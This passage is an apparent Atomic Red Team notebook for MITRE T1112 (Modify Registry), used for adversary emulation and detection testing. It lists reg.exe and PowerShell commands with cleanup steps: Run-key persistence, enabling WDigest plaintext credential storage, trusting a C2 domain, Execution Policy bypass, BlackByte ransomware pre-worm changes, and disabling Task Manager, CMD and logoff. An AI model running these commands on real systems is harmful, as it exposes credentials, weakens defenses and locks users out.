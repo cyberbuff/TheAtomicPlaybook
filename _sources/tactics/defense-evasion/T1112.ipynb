{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ab00bcae",
   "metadata": {},
   "source": "# T1112 - Modify Registry\nAdversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication."
  },
  {
   "cell_type": "markdown",
   "id": "bb914248",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "4f6c157d",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Modify Registry of Current User Profile - cmd",
    "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1c061e26",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "8b1b8bde",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "22bc2990",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "681333ac",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Modify Registry of Local Machine - cmd",
    "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77be59a3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "7e6a12ce",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5eeda356",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "73b077e0",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Modify registry to store logon credentials",
    "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbd7196d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "31ba65bb",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d3d6d58",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "046b1a7f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Add domain to Trusted sites Zone",
    "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20233da5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "1f277228",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cebeb13c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a254bef4",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Javascript in registry",
    "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecacaa54",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "e585edaf",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c19aac53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ee08682b",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Change Powershell Execution Policy to Bypass",
    "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "de3e33d2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "0d585db2",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61093909",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "03244caf",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - BlackByte Ransomware Registry Changes - CMD",
    "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f485938c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "da2ee01c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd90a007",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "53968da8",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - BlackByte Ransomware Registry Changes - Powershell",
    "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36fe7b15",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "2f82aa3a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ddd780b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3ee46b24",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Disable Windows Registry Tool",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "88d6afe2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "dfd2e32f",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\npowershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ea191418",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7cdeb4ca",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Disable Windows CMD application",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0e00dd2a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "807db38e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ebdb366",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "082cc17f",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Disable Windows Task Manager application",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f36b8f52",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "83585ab4",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a7d1c6c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "80928fcc",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Disable Windows Notification Center",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb5496e8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "762effdc",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2471a26",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 12 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f3cda764",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Disable Windows Shutdown Button",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31e0d48d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "eafd3299",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3801ce2f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "63400324",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Disable Windows LogOff Button",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f480ce81",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "466ac5cd",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "28cabb19",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d07b1e80",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - Disable Windows Change Password Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ace1b70",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "227e04a2",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ac588a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 15 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c8632577",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - Disable Windows Lock Workstation Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95d234d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "30c101ef",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7804dee3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "115b4523",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Activate Windows NoDesktop Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb756489",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "0752b081",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f76a4bf7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "22e89812",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Activate Windows NoRun Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23007fe0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "6fb7f539",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "470be543",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 18 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eb8734b3",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Activate Windows NoFind Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95920932",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "311d2997",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15fa732e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 19 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ec34c55a",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Activate Windows NoControlPanel Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
